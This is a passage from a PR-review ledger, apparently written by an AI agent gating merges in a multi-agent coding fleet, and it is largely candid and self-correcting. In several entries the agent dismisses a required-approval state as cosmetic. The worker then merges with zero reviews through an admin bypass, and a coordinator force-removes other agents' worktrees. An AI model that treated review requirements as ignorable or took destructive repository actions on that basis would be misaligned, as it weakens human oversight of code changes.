it — its rows are right individually and MUST NOT BE SUMMED.** Both their "6 of 790" and my "0 of 62"
performed exactly that summation. Neither of us was right about scope, in opposite directions, and the
true number needed both corrections — a better argument for two independent measurements than either of
us reporting cleanly would have been.

One thing of theirs worth recording against my own analysis: I checked whether the eight symlinks were
SAFE under `--apply` and stopped there. **Safe is not converged.** Their review found that a link
resolving correctly but naming another home would have read `converged` for ever, with doctor printing
PASS over one account being master for six projects; they added a NORMALISE arm. My "both orders are
safe" conclusion would have shipped that, because I only asked one of the two questions.

---

## 2026-09-09 22:3x — PR #69 round 5 gated: MERGE after two one-line fixes (worker mail 366 → my 377)

Head `6f27554b`, MERGEABLE, **all five CI checks SUCCESS including `test-macos`**. Review: 8 lenses on
opus over `c3e69b41..6f27554b` (two commits), one adversarial refute pass on sonnet per finding.
**46 agents, 0 errors, 38 raised, 8 refuted, 30 survived — deduplicating to ~12 defects.** Six lenses
independently found the same tautology; five found the same "four sites" miscount. Report:
`pr69-round5-gate.md` (mail 377's artifact).

**All six gate items closed. I re-measured the two must-haves myself, with a control:** mutating the
`swapblocked` clear → RED; dropping `cmd_prefer`'s `! _pool_untaggable` → RED; `cmd_swap`'s identical
gate → RED (control, still pinned); `cmd_start`'s new warn gate → RED. Each names its own case.
**Item 1 came back better than I asked for:** the false "Pinned in both directions" sentence was KEPT and
corrected *with its own history* — "and that sentence was itself a false claim about a mechanism until
round 5". Deleting it would have erased the lesson; that is the right way to retire a false claim, and it
supersedes my own delete-or-point framing for this case.

Item 4 verified by enumeration, not by reading the fix: `.tickstuck` can carry wrapper / project / home /
crosspool / pool / rc$n, and `_undecidable_cause` now has an arm for each plus `*`. Complete coverage, no
dead arm, no word without a sentence. Full server suite on the PR head: **278 files / 7709 passed / 56
skipped** — matching the worker digit for digit, after they took the tree lesson from D-2309.

**THE FINDING IS THE PATTERN, not any item in it.** Round 4's gate found 6. Round 5 closed them, and the
worker's own nine-lens refute pass found **7 defects inside the commit that closed them**. My round-5
gate finds **~12 inside the commit that closed those 7**. Of those 12: **zero behavioural, zero touching
a guard, eleven citations** — most introduced or left standing by the very commit whose stated purpose
was sweeping that class. **The prose-correction loop has gone negative-yield: each round fixes citations
at roughly the rate it creates them.** Another round finds ten more and makes ten more. That is a
treadmill, not diligence.

**The structural cause is in the delta's own proportions: 272 lines of `ccd/ccd` against 340 lines of
plan.** The prose describing the change is now larger and far more fragile than the change, and every
count in it is a claim about a tree the next commit moves. **A citation swept in the same commit as other
work is stale before the commit lands** — which is the mechanism, not the symptom. The only shape in
which this class converges is ONE follow-up whose sole content is a citation sweep, against a frozen
tree, with nothing else in the commit.

**The two fixes asked for before merge**, both one line, neither carrying a design: (1) the tautology at
`ccd-reg-get-census.test.ts:156-159`, `expect(bare - filtered, …).toBe(bare - filtered)` — cannot red on
any tree, carries a message claiming a check it does not perform, in the commit whose subject is
assertions that pass for the wrong reason; proved both ways (RHS `+1` reds, so the line executes; a
content mutation moving the real delta 1→2 leaves all three green). (2) `ccd/ccd:13005`, a prose
REGRESSION — round 4 correctly said round 3's mkdir spelling "matched only its own citation"; `6f27554b`
overwrote it with "matched nothing at all … zero hits", which is false (measured 1 on round 3's own tree)
and self-refuting on the shipped tree, since the sentence re-quotes the spelling and `grep -cnF` at HEAD
returns 1 — the very line asserting zero.

**A correction to my own reviewer, recorded because it is the same class:** one lens reported the
`ccd+pools 68 / 1954` figure as being at `plan:988`; it is not in the plan at all, it is in the commit
message. **My reviewer misattributed a misattribution finding.** And I did NOT report the figure as
wrong: I measured `ccd-*`+`pools*` at 63 / 1762 / 12, and 68/1954/12 is consistent with a five-file
superset — **the skip count matches exactly, which is what a real superset looks like.** I could not
determine their glob, so there is no finding. Same discipline as round 4's "65 files". The rule that
keeps earning its place: *two count discrepancies with the same cause is a finding; one with an unknown
cause is a guess.*

**Carried to the wave-4 CLOSE, not the merge:** `ws/clear-meadow` (`274984e3`) and `fix/c1-rescue-lane`
(`6f27554b`) are fully diverged — neither contains the other, 96 files apart, the workspace branch still
on `644aea41` (#68) while the PR sits on `ee1d6228` (#71). That is the right shape for the PR, but the
done-fingerprint re-measures the WORKSPACE branch, so the close will read `stale-tip` unless that branch
is brought to the merged commit first. This is CLAUDE.md's documented "a feature branch wedges every
close" hazard, live, and it needs handling before wave 4 closes.

---

## 2026-09-09 23:0x — #69 went CONFLICTING; resolution measured and handed over (my mail 385)

**`e227329e` (#73, the resume-interrupted-turn work) merged to main and touches `ccd/ccd`.** #69's five
SUCCESS checks are now STALE — built at 21:09 against the old main. **A conflicting PR has no merge
commit, so no check can run at all**; the conflict is what blocks CI, not the checks. Same shape as the
pre-compaction conflict, and the same trap: the green you can see is about a tree that no longer exists.

**The conflict is exactly ONE marker line at line 2.** Everything else auto-merged. I verified both
contributions survive by count rather than by eyeballing the merge: `_pane_auto_continue_armed` 5,
`_resume_env` 4, `RESUME_INTERRUPTED_TURN` 7, `auto-continue` 4 — all matching main exactly; and
`_undecidable_cause` 7, `! _pool_untaggable` 5, `Pinned in both directions` 1 — all matching the PR head
exactly.

**Resolution, measured end to end and handed over as a patch — NOT pushed to the worker's branch:** drop
both marker lines, apply **one required prose fix** (the `_reg_get` census sentence, `ccd/ccd:1809-1810`,
**132/108 → 133/109**, because #73 adds one `_reg_get "` call on one new non-comment line), then re-mark.
Verified: server **280 files / 7753 passed / 56 skipped**, agent 18, pwa 80 + typecheck clean, one marker
verifying, platform block `e7f0696d` untouched.

**A CORRECTION TO MY OWN ROUND-5 VERDICT, and it is the useful part.** I wrote that the prose-correction
loop had gone negative-yield. **That was true of prose with NO MECHANISM.** The full suite on the raw
merge failed exactly once — `ccd-reg-get-census.test.ts`: *"ccd/ccd now makes 133 `_reg_get "` calls, but
the census still claims 132. Re-measure the sentence, do not re-measure this test."* It caught a stale
citation the instant an unrelated PR landed, and its failure message gives the correct remedy while
forbidding the wrong one. **The problem was never that prose carries counts; it is that counts had no
mechanism.** This one does. The cost is real — any PR touching `_reg_get` in `ccd/ccd` now reds this
suite until the sentence is re-measured — and it is the RIGHT cost, because the alternative is a census
that quietly lies. So the follow-up citation sweep I asked for matters less than I said for this class:
it is self-policing now. **Extend the pattern, don't extend the sweep.**

**A near-miss worth recording as a rule.** #73's diff hunk header reads `@@ … _swap_target() {` and the
change is **not in `_swap_target`** — it adds `_pane_auto_continue_armed` after that function's closing
brace. **A hunk header is git's guess at the enclosing symbol from preceding context, not a claim about
what changed.** I began reviewing `_swap_target`'s body for an interaction that was never there. Same
family as every other anchor-is-a-claim defect this program keeps booking, except the false anchor is
generated by the tool rather than written by a person.

**The interaction I did check, and it is clean.** #73's R1 ruling has the rescue arm deliberately
ignoring auto-continue while "the three sites that TYPE into a pane" must not. `_auto_swap_check`'s #69
changes type nothing into a pane — no `send-keys`, no `_inject`, no `paste-buffer` on any of its paths;
it writes strand markers and stamps only. R1's carve-out and #69's changes do not meet.

Still outstanding at `6f27554b`: the two one-liners from mail 377 (the tautology, and `13005`'s "matched
nothing at all" where round 4 had it correct). Order given to the worker: the two one-liners, then the
merge, then push once — CI can only run after the conflict is gone.

---

## 2026-09-09 23:1x — the false zero was MINE, and its cause is the environment (worker mail 382 → my 386)

Worker pushed **`86260cc5`** at 22:55 with both merge-gate fixes. Their 382 crossed with my 385: #73 had
already landed at ~22:0x, so **#69 was CONFLICTING before their push and their "ready to merge" was
measured against a main that had moved.** `gh pr view 69` now lists **no checks at all** at that head —
the clearest demonstration yet that a conflicting PR runs nothing.

**THE ROUND-4 ZERO WAS MINE, AND THE CAUSE IS WORSE THAN "I QUOTED A REVIEW".** The worker booked D-2340
saying they shipped a number out of my gate artifact without re-measuring. True — and I measured why it
was wrong: **`/usr/bin/grep` on this box is `ugrep 7.8.4`, while GNU grep sits at `/bin/grep` (3.11).**
PATH order decides which one a session runs, and they disagree: ugrep reads a `$` MID-PATTERN as an
end-of-line anchor even in a BRE, so

    grep  -c 'mkdir -p "$POOLS_DIR"' <round-3 tree>  -> 0   (ugrep, rc=1)
    grep -cF 'mkdir -p "$POOLS_DIR"' <round-3 tree>  -> 1

**My round-4 artifact ran the unfiltered form, reported zero, the worker shipped it into `ccd/ccd`, and I
then flagged the result as a prose regression in round 5.** A closed loop of my own making — and the
"shell-quoting will betray you, use `-F` for `$` patterns" line was in the preamble *I wrote for my own
review subagents*. I put the rule in the instructions and not in my hands.

So D-2340 is stronger than the worker wrote it. Under "a measurement quoted from a review is a claim, not
a fact" sits: **a measurement is only a fact together with the tool that produced it.** `grep` is not the
name of one program. Recorded as memory `a-measurement-is-only-a-fact-with-its-tool`.

**Blast radius audited against GNU grep -F, not assumed:** `_swap_target "` = 1 occurrence (my "exactly
ONE call site" holds); `! _pool_untaggable` = 5 (holds); `_project_pool_state` = 12 non-comment lines =
1 definition + **11 consumers**, on both the round-4 and round-5 trees (holds, and D-2304's premise with
it). None of those patterns carried a `$`. **The blast radius is the one mkdir negative.**

**I withdrew my own fix proposal.** I had proposed asserting `statedBare - statedFiltered` against the
comment-line count. The worker is right that `bare - filtered` IS that count by construction, so any
assertion on the difference is derivable from the two above it — my "checkable form" was a second
tautology wearing arithmetic. Their `bare > filtered` is the non-derivable claim (that anything quotes
the pattern at all), measured RED in isolation with the two neighbours held green. Better than mine.

**The glob non-finding resolves in their favour and mine.** `ls test/ | grep -E '^(ccd|pools).*\.test\.ts$'`
picks up the two `ccdargv-*` suites — 65 — plus ownership, deviation-refs and single-definition = **68**.
My 63 + those five is exactly it, which is why **the skip count matched at 12**. Declining to report it
in rounds 4 and 5 was right both times; the skip-count match was the signal.

**Merge re-measured at the new head, handed over as a patch, not pushed:** conflict is still exactly one
marker; drop both marker lines, apply the census fix **132/108 → 133/109**, re-mark. Verified: server
279/280 files (the one failure `session-hook`'s 4x timing assertion, **green in isolation**, as was
`pr-sweep` — the same two the worker saw, both on the known-load-flake list, neither in the delta), agent
18, pwa 80 + typecheck clean, one marker verifying, platform block `e7f0696d` unchanged.

**Verdict unchanged: merge once the conflict is gone.** Nothing in the merge touches the round-5
clearance, and the census suite caught the one thing that did need changing, by itself, the instant main
moved.

---

## 2026-09-09 23:4x — #69 MERGEABLE again, CLEARED TO MERGE at `f065c8bb` (worker mail 387 → my 391)

Worker resolved the conflict the correct way — **both marker lines dropped with the conflict block, then
`markGenerated` over the merged body** — and re-measured every count I sent rather than taking it. Head
`f065c8bb`, a real merge (parents `86260cc5` + `e227329e`; `origin/main` IS an ancestor).

**Verified here independently:** server **280 files / 7753 passed / 56 skipped**, zero failures, no
flakes; agent 18; pwa 80 + typecheck clean. Census sentence **133/109**, matching the measured
calls=133 / lines=109 under its own classifier. One marker, `ccrc-unmodified`. Platform block
`e7f0696d`, byte-identical to `ccd/ccrc`. Both sides intact by count — `_pane_auto_continue_armed` 5 /
`_resume_env` 4 / `RESUME_INTERRUPTED_TURN` 7 / `auto-continue` 4 against main, `_undecidable_cause` 7 /
` && ! _pool_untaggable` 5 / `Pinned in both directions` 1 against `86260cc5`, each matching its own side
and neither the other. **280/7753 is also exactly what my own resolved merge measured before theirs
existed — two independent resolutions, one number.**

**I diffed their resolved `ccd/ccd` against mine: theirs is better.** Two differences only — the marker
digest, and the census HISTORY clause. I fixed the number and left the paragraph around it saying "four
times in five rounds"; they extended it to five and named the one nobody here made — *"the first move
nobody here made, and the first one something SAID"*. **Repairing a count versus repairing the claim the
count sits in.** I would have shipped the smaller fix, and it would have gone stale in the same sentence
it corrected.

**MY OWN MAIL BUG, recorded because it is the same class as everything else this week.** My clearance
mail's subject-length assertion fired, so the payload JSON was never written — and I had sequenced
`ccrc-api mail send` UNCONDITIONALLY after it, so the client picked up a leftover file of the same name
from 11:11 and re-sent a 12-hour-old memory-merge status as mail 390. **A generator that fails and a
sender that runs anyway is the shell's version of an overloaded null: the send could not tell "no new
payload" from "here is the payload".** Fix is `&&` between generating and sending, applied. Corrected in
391, which leads with the disregard.

**Still in flight, neither mine:** `test-macos` (four of five green), and the worker's own three refute
lenses on the merge resolution — lost/duplicated content, the census change and its anchors, and whether
#73's pane-typing machinery meets #69's tick. They declined to sign off a merge resolution from a reading
because **the last merge on this PR is what produced D-2216**, which is the right instinct; my R1 walk
and count checks are evidence, not a substitute.

**Not to wait on:** `mergeStateStatus: BLOCKED` is cosmetic here — measured branch protection has
`required_approving_review_count: 0`, and #70, #68 and #67 all merged in that exact state with zero
reviews. Green checks plus MERGEABLE is the whole gate.

**[FALSIFIED 2026-09-10 07:22 — see the merge entry at the end of this file.]** Both sentences above are wrong. `branches/main/protection` is only ONE of GitHub's two rule surfaces; ruleset 22520257, active since 2026-09-08, requires **one approval** with Admin/Maintain bypassing, and the required checks are **four** — `test-macos` is additive and non-required. The seven merges at `reviews=0` are equally consistent with "no approval required" and "approval required, this actor bypasses", so they were never evidence.

**Booked to the follow-up, both tool-generated false anchors:** git's `@@ … symbol` hunk header (an
enclosing-symbol GUESS from preceding context, not a claim about what changed) and the ugrep zero. Both
are false anchors no amount of author care prevents, which is what distinguishes them from the rest of
the citation class.

---

## 2026-09-10 00:2x — #69 cleared again at `f27c4d50`; D-2347 ruled; and I endorsed a false clause

Worker's three refute lenses on the merge resolution: **the resolution survived** — one lens rebuilt the
three-way merge of all 23 touched files from the true base `ee1d6228` and found 21 byte-identical to the
mechanical union, every one of #73's 137 added lines and #69's 1075 inside its own enclosing function,
zero lines lost, no conflict residue. Verified here at `f27c4d50`: server **280 / 7753 / 56, zero
failures**, agent 18, pwa 80 + typecheck clean, one marker verifying, census stated 133/109 against
measured 133/109, platform block `e7f0696d` still identical to `ccd/ccrc`.

**I ENDORSED A FALSE CLAIM, and it is the cleanest instance of my own recurring failure this week.** My
mail 391 said the worker's census history clause "beats my minimal fix" and singled out the exact
sentence — *"named the one nobody here made"* — that their own D-2343 has now measured false (six moves
not five, mis-ordered, and the #70 merge had already moved it from main's side). **I compared their prose
change against MY prose change, judged which was more thorough, and never measured either against the
history.** A diff between two versions of a claim tells you which is more DETAILED, never which is TRUE.
I spent the week telling the worker to open what a citation cites, and reviewed a citation by comparing
it to my own draft. Their D-2344 verified independently: `db580771:1611` reads "134 call sites", so C1
measured correctly and the branch's prose inherited a wrong 133.

**D-2345 is the best finding of the round and generalises past this pin.** *"Every false claim landed in
the one span the pin cannot read."* That is a property of ANY scanner with an END anchor: the unread
region is exactly where the prose that ARGUES lives, so edits gravitate there — **the blind spot and the
churn are the same region by construction.** The remedy shape (causal sentences above the anchor; the
list bare, dated, one command per entry, nothing that argues) is a rule for the next pin anyone writes,
not a fix to this one.

**RULING — D-2347 (#73's inherited FIFO hang): NOT in #69, its own PR, and the fix belongs upstream of
where it was filed.** The worker declined to take it, citing my own "designs made at merge time ship
wrong". Right, and the decisive reason is stronger: it is **byte-identical on `origin/main`, and main is
already deployed on both lanes** — holding #69 reduces live exposure by exactly zero seconds and merging
it increases exposure by zero. Orthogonal.

**But `-r` in `_transcript_stalled_pair` is the SECOND line of defence.** `_transcript_path` has THREE
arms that all gate on `-f` — the munged path, the raw path, and `_transcript_matches`'s own
`[[ -f "$f" ]] || continue` — and then a FALLBACK that returns `$cfg/projects/$munged/$uuid.jsonl`
**unconditionally: the exact path arm 1 rejected three lines earlier for failing `-f`.** Three arms
measure and the fallback guesses, and it guesses the path the measurement already refused. That is a
measured function with an unmeasured tail, not a missing test in a reader.

Blast radius measured before ruling: four consumers — `_ws_archive_manifest`, `cmd_ws_audit`,
`_ws_tombstone`, `_redrive_after_spawn` — and **only the last opens the file**, so the worker's hang
analysis is exactly right. The other three embed the path in a manifest, an audit row and a tombstone;
fixing the fallback also stops three durable records naming a path the function itself measured is not a
transcript. Offered to take it into my own ccd queue plan
(`2026-09-09-ccd-queue-platform-shim-and-doctor-coverage.md`) if the worker would rather stay on wave 4.
**What it must not do is sit as a booked number: it is live on a deployed fleet.**

Also noted: their correction that TWO files carried non-mechanical merge content, not one. That matters
more than they framed it — a reviewer told "one file" does not go looking at the test that pins the very
sentence, which is precisely the reviewer I was.

---

## 2026-09-10 01:4x — #69 IS 5/5 GREEN AND MERGEABLE at `f27c4d50`. Gate complete (my mail 414)

`test-macos` returned SUCCESS. **All five checks green, `mergeable: MERGEABLE`.** My clearance at 399
stands: verified independently at server **280 / 7753 / 56, zero failures**, agent 18, pwa 80 + typecheck
clean, one marker verifying, census stated 133/109 against measured 133/109, platform block `e7f0696d`
identical to `ccd/ccrc`. **The merge is the worker's/operator's act; I gate and do not merge.**

`mergeStateStatus: BLOCKED` and `reviewDecision: REVIEW_REQUIRED` are both **cosmetic on this repo** —
measured branch protection carries `required_approving_review_count: 0`, and #70, #68 and #67 all merged
in exactly that state with zero reviews. Five green checks plus MERGEABLE is the whole gate.

**[FALSIFIED 2026-09-10 07:22 — see the merge entry at the end of this file.]** Both sentences above are wrong. `branches/main/protection` is only ONE of GitHub's two rule surfaces; ruleset 22520257, active since 2026-09-08, requires **one approval** with Admin/Maintain bypassing, and the required checks are **four** — `test-macos` is additive and non-required. The seven merges at `reviews=0` are equally consistent with "no approval required" and "approval required, this actor bypasses", so they were never evidence.

**A fleet hazard worth carrying, and it hit me:** the crossrepo coordinator (`claude-ccrc-pwa`) removed
four of my scratch worktrees at ~02:05 by running `git worktree list | grep scratchpad` in the main
checkout and force-removing every match. **Every ccd workspace is a worktree of the SAME repository, so
`git worktree list` is FLEET-WIDE** — a filter that looks local is not. Nothing was lost here: the
removals included `rw-f27c`, the tree I had verified this head in, but the verification was complete and
its results were in mail 399 and this ledger before the removal, and `ws/amber-summit` was clean and
pushed at `17bd0ca0`. **Clean by exact path, never by filtering that list.** They have recorded it as
`git-worktree-list-is-fleet-wide`; my own removals in this session all named exact paths under my session
scratchpad, which is why they were safe.

**What follows the merge, in order:**
1. **Wave-4 close** — `ws/clear-meadow` must reach the merged commit before the done-fingerprint runs or
   it reads `stale-tip`. Worker handles it at close time.

   **[FALSIFIED 2026-09-10 10:5x — I INVENTED THE MAIN-CONTAINMENT HALF.]** `verifyDone`
   (`server/src/coord/fingerprint.ts`) never mentions `main`, an ancestor test or containment —
   grepped across the whole close path. It requires only *measured tip of the registry-named
   branch === `claim.branchTip` === `claim.handoffCommit`*, at one instant. `CLAUDE.md` says a
   FEATURE branch wedges the close; it never says the branch must reach `main`. **The real risk
   is the PR check**: `pr-state --session` measures the WORKSPACE branch, which is bound to #67,
   so a claim naming #78 is refused `pr-regressed`. See the close ruling entry at the end.
2. **D-2347** — its own small ccd PR, agent-first, fixing `_transcript_path`'s unmeasured fallback rather
   than only `_transcript_stalled_pair`'s `-r`. Offered to take it into my ccd queue plan
   (`2026-09-09-ccd-queue-platform-shim-and-doctor-coverage.md`) so the worker can stay on wave 4. It is
   live on a deployed fleet and must not sit as a booked number.
3. **D-2341** — the citation sweep, frozen tree, nothing else in the commit.
4. Then the operator's standing ruling: **spawn the ccd workspace** against the queue plan (D-2187–D-2193,
   D-2224, now plus D-2347), and wave 3's remaining tasks.

**The pattern worth keeping from these five rounds:** every defect that mattered in the last two rounds
was found by someone refuting their OWN work — the worker's nine lenses on the commit that closed my six,
their three on their own merge resolution, and my two self-corrections tonight (the ugrep false zero I
authored, and the false history clause I endorsed by comparing it to my own draft instead of to the
history). **Adversarial review of someone else's work finds less than adversarial review of your own,
because only the author knows which claims were never measured.**

---

## 2026-09-10 07:22 — **PR #69 MERGED at `24f32a18`** — and the gate I cleared it against was not the gate

**The merge.** Squash, hand-written body, by the worker via `--admin`. Verified on `origin/main` by
CONTENT, not ancestry (a squash merge cannot fail `--is-ancestor`, so that test proves nothing):
`_undecidable_cause` 7, `! _pool_untaggable` 5, `Pinned in both directions` 1; #73's
`_pane_auto_continue_armed` still 5; one marker verifying `ccrc-unmodified`; census stated 133/109
against measured 133/109. The worker adds `git diff f27c4d50 origin/main -- ccd/ccd` EMPTY, six test
files and the plan at zero differing lines, and **402/402 on the #69+#74 union** — the tree neither
PR's CI ever tested (D-2309).

### My branch-protection measurement was wrong TWICE, in opposite directions

The entry above this one says *"measured branch protection carries `required_approving_review_count: 0`
… Five green checks plus MERGEABLE is the whole gate."* **Both halves are false, and the merge is what
found it** — `gh pr merge` answered *"the base branch policy prohibits the merge."*

GitHub has **two rule surfaces**, and I measured one:

| surface | says |
|---|---|
| `branches/main/protection` (classic — what I measured) | `required_approving_review_count: 0`; contexts = **four**: `test (server)`, `test (agent)`, `test (pwa)`, `build-pwa`; `strict:false`; `enforce_admins:true`; `required_conversation_resolution:true` |
| `rules/branches/main` (rulesets — what I never opened) | ruleset **22520257**, active, created **2026-09-08T08:11:31Z**, *"main: one approval, Admin and Maintain bypass on pull requests"*, `required_approving_review_count: **1**`, `bypass_actors` = RepositoryRole 5 (Admin) and 2 (Maintain), mode `pull_request` |

Rulesets are **additive** to classic protection and the stricter value wins. The real gate is
**checks + MERGEABLE + conversations resolved + (one approval OR a bypassing role)**. The worker merged
through the ruleset's own named Admin bypass — the same path all seven prior merges took.

**Error two, the opposite way: I said FIVE required checks. There are four.** `test-macos` is not
required by either surface, and `.github/workflows/ci.yml:129` says so in its own comment — *"`test-macos`
is additive and non-required — a red here blocks nothing."* I had been reading the *rollup* (what ran)
as the *requirement* (what gates). **`required_conversation_resolution: true` is a real gate I never
named at all**, and is the likeliest reason `mergeStateStatus` read `BLOCKED` — which I had written off
as cosmetic.

### Why my instance evidence could not have caught it — the part worth keeping

I argued from instances: #70, #68 and #67 merged at zero reviews, so approvals must not be required. The
worker widened it to all seven merges since the ruleset existed — #62, #66, #67, #68, #70, #73, #74 —
and **every one merged with `reviews=0`.** A perfect record, and it discriminates nothing: those seven
are equally consistent with *"no approval is required"* and with *"an approval is required and this
actor bypasses it."* Only the rules endpoint separates the two hypotheses.

`measure-the-rule-not-just-the-instance` was already a memory of mine, and I still failed it — because
I believed I HAD measured the rule. **The upgrade: when a platform has more than one rule surface,
measuring one surface is still measuring an instance.** A rule read is only a rule read if it enumerates
every surface that can impose the constraint. I have widened that memory rather than adding a new one.

### The claim has a blast radius outside this program — reported, not edited

`required_approving_review_count` is asserted as **policy** in three docs that are not mine:

- `docs/superpowers/plans/2026-08-23-stage5-flip-checklist.md:55` — *"stays 0 by explicit choice (single maintainer; revisit at the first outside contributor)"*
- `docs/superpowers/specs/2026-08-21-stage5-oss-decision-brief.md:33` — *"is 0 today"*
- `docs/superpowers/specs/2026-08-22-stage5-oss-polish-design.md:181` — *"stays 0 by explicit choice"*

All three predate 2026-09-08T08:11Z and were **true when written**. The ruleset's creation IS the
"revisit" those docs schedule, and it left no trace in any of them — a green-test-goes-stale-untouched
in prose. They belong to the Stage 5 OSS programme, which is closed and has no live coordinator, so I
am **reporting them, not editing them**: silently rewriting another programme's approved design docs is
exactly the move this program has been refusing all week. Flagged to the operator.

### D-2348 — booked, killed by its own author, deliberately NOT in the merge

The worker allocated and defined D-2348 (git's `@@` hunk headers naming a function the change is not
in), committed it locally, then pointed three opus lenses at it. All three killed something —
**eleven corrections in a 28-line entry whose own subject is tool-generated false anchors.** Two are
structural: the stated mechanism was self-refuting (git searches strictly ABOVE the hunk start, and the
preimage, so a function the commit ADDS can never be named by any `xfuncname`), and *"no configuration
reaches this class"* is simply false (`diff.<name>.command` prints the right name for both shapes) —
the conclusion survives only on **reach**, since GitHub's PR view, the PWA's diff surface and plain
`git show` honour none of it. Also: `* diff=bash` is not neutral on the real corpus but **worse**
(wrong-function 4 → 5 of 12), generalised from a one-hunk fixture when the corpus was one command away;
"6 of 12" pads; and *"a 15.8k-line file"* is a bare cardinal already false on its own commit (16,848).
**It stays allocated and unlanded until rewritten**, and it was never going into a cleared merge at the
last second. That is the right call and I have told them so.

### Queue after the merge

1. **Wave-4 close** — `ws/clear-meadow` must reach `24f32a18` before the done-fingerprint runs or it
   reads `stale-tip`. Worker's act, at close time.

   **[FALSIFIED 2026-09-10 10:5x — I INVENTED THE MAIN-CONTAINMENT HALF.]** `verifyDone`
   (`server/src/coord/fingerprint.ts`) never mentions `main`, an ancestor test or containment —
   grepped across the whole close path. It requires only *measured tip of the registry-named
   branch === `claim.branchTip` === `claim.handoffCommit`*, at one instant. `CLAUDE.md` says a
   FEATURE branch wedges the close; it never says the branch must reach `main`. **The real risk
   is the PR check**: `pr-state --session` measures the WORKSPACE branch, which is bound to #67,
   so a claim naming #78 is refused `pr-regressed`. See the close ruling entry at the end.
2. **D-2347 — MINE now.** The worker accepted the ruling and asked me to take it so they can stay on
   wave 4. My blast radius is what decided its shape: four consumers, only `_redrive_after_spawn` opens
   the file; the other three embed the guessed path in a **manifest, an audit row and a tombstone** — so
   fixing the reader's `-r` alone leaves three durable records naming a path the function measured is
   not a transcript. It goes into the ccd queue plan, and it is live on a deployed fleet.
3. **D-2341** — the citation sweep, frozen tree, worker's.
4. **Spawn the ccd workspace** against `2026-09-09-ccd-queue-platform-shim-and-doctor-coverage.md`
   (D-2187–D-2193, D-2224, now plus D-2347). **Note for that plan's Part A:** it fixes a Darwin arm in
   the platform block, and `test-macos` — the only job that runs on a real macOS runner — **is not a
   required check.** The pin that does gate it is `macos-platform.test.ts`, which rides `test (server)`
   and compares the two files' bytes; it cannot observe Darwin behaviour. Part A must ship its guard
   with a test that reds under `test (server)`, not under `test-macos`.

**Two merges, two lessons, same shape.** Round 4's ugrep false zero was a measurement whose TOOL I had
not identified; this was a measurement whose SURFACE I had not enumerated. Neither was a wrong reading —
both were correct readings of the wrong thing, reported as facts about the world.

---

## 2026-09-10 10:4x — D-2347 started. **The defect is real and the fix is verified. My ruling about WHERE it belonged was wrong.**

Operator said "start it". What follows is the gate work, and most of it went against me.

### The defect, reproduced — and one shape the booking does not name

Measured on a clean worktree cut from `origin/main` at `24f32a18`, with the call BOUNDED (an unbounded
red here is a hung CI job, not a failing test):

| input to `_transcript_stalled_pair` | before | after `[[ -f "$f" && -r "$f" ]]` |
|---|---|---|
| a real stall (the positive path) | 0 | 0 |
| regular file, not a stall | 1 | 1 |
| absent | 2 | 2 |
| **FIFO** | **HANG** (`timeout` killed it, rc 124) | 2 |
| **character device** (`/dev/zero`) | **HANG** | 2 |
| **directory** | **1** | 2 |

`ccd-redrive.test.ts` 30/30 after the fix; `ccd-resume-flag` + `transcript-ladder` + `ccd-project-pool`
106/106. The booked one-line remedy is correct and complete.

**The directory row is not in D-2347's text, and it falsifies one clause of it.** The booking says the
remedy is *"behaviour-identical for every input that answers today, since absent already returns 2"*.
A directory ANSWERS today — it answers **1**, "measured, and not a stall" — and after the fix it answers
2, "I could not measure." That is a behaviour change, and a correcting one: `tail` on a directory writes
to stderr and emits nothing, so the loop reads zero lines and the function reports the status quo it
never observed. Same overloaded-return family as the hang, reached without hanging.

### **MY UPSTREAM RULING WAS WRONG.** The spec specifies the thing I called a defect

I ruled that the fix "belongs upstream at `_transcript_path`'s unmeasured fallback rather than only
`_transcript_stalled_pair`'s `-r`", and I put that in this ledger, in mail 391's successor and in mail
427 to the worker. `docs/superpowers/specs/2026-08-12-swap-transcript-defect-family-design.md` §2.5
specifies rung 4 verbatim:

> 4. the resolved munge unchecked, exactly as today, so a session that has genuinely written nothing yet
>    still records the canonical address rather than an empty string.
>
> The function's contract — **print one path, return non-zero only when the registry cannot answer** —
> does not change, so no consumer and no manifest format moves.

So `_transcript_path` returning rc 0 for a guess **is the contract**, argued and accepted, not a
collapse. Three independent opus refuters killed my "the docstring names its own harm" reading **3/3**,
and the strongest version is the one I missed: the harm sentence is scoped to *"a session that moves"* —
a transcript that exists at ANOTHER address — and rungs 1–3 eliminate exactly that case before rung 4
can run. Rung 4 is reachable only when no transcript for that uuid exists anywhere under this config
dir, where there is no rival address to be wrong about. **Disclosure is not self-contradiction.**

I read the CODE and inferred the rule. The spec that governs it was one file away. Third instance this
week of the same failure — after the ugrep tool error and the two-surface protection error — and the
only one that would have put a false deviation into a plan and dispatched it to a worker.

### And the claim I mailed the worker was wrong too: TWO durable consumers, not three

Refuted 3/3, and I confirmed it myself rather than taking it: `_transcript_path`'s four call sites are
`_ws_archive_manifest` (6828, persisted by `_reg_set "$id" archivemanifest` at 6503 — DURABLE),
`cmd_ws_audit` (9444 — **stdout only**), `_ws_tombstone` (10157, writes `$REG/.reaped/<id>.json` —
DURABLE), and `_redrive_after_spawn` (14362 — the only one that OPENS the file). `cmd_ws_audit`'s own
header says it *"destroys nothing and creates nothing that outlives it — no worktree, no branch, no
registry field, no tombstone"*. I said "a manifest, an audit row and a tombstone" in mail 427.

**The spec makes the identical error**, which is where I got it: §2.5 calls them *"`_ws_archive_manifest`,
`cmd_ws_audit` and `_ws_tombstone`: the durable records written when a workspace is archived, audited
and reaped."* One of those three is not a record and is not durable. Booking it.

### The fix is not a new pattern — it is this program's OWN pattern, applied where it was missed

`ccd/ccd:1331`, inside `_project_pool_state` — **account-pools wave 2a, ours** — already carries
`[[ -f "$f" && -r "$f" ]]` with the argument written out: *"a character device gets the one answer that
is safe for all of them… `-r "$f"` is checked in the SAME breath."* And `ccd-project-pool.test.ts`
already carries the whole test vocabulary: a `boundedState` helper whose docstring explains that
**vitest's own per-test timeout cannot save you** — `h.sh`'s `execFileSync` is SYNCHRONOUS and blocks the
event loop the timer would fire on, so the bound must live on the child process — plus cases for FIFO,
symlink-to-FIFO, symlink-to-`/dev/zero`, directory, mode-000 and broken symlink, each double-bounded.
`ccd-crosspool.test.ts` carries six more FIFO cases.

So D-2347 is sharper than "a missing test in a reader": **`_transcript_stalled_pair` is the one function
in this class written outside an established, argued, already-tested house pattern that three suites in
the same tree use.** That is what Part D should say, and it makes the remedy a transcription rather than
a design.

### My own mistake, recorded

I ran `git checkout origin/main -- .` in this worktree as a careless reset. It rewrote every tracked
file to main's content and STAGED it — a 190-file index. Nothing was lost: `ws/amber-summit` was pushed
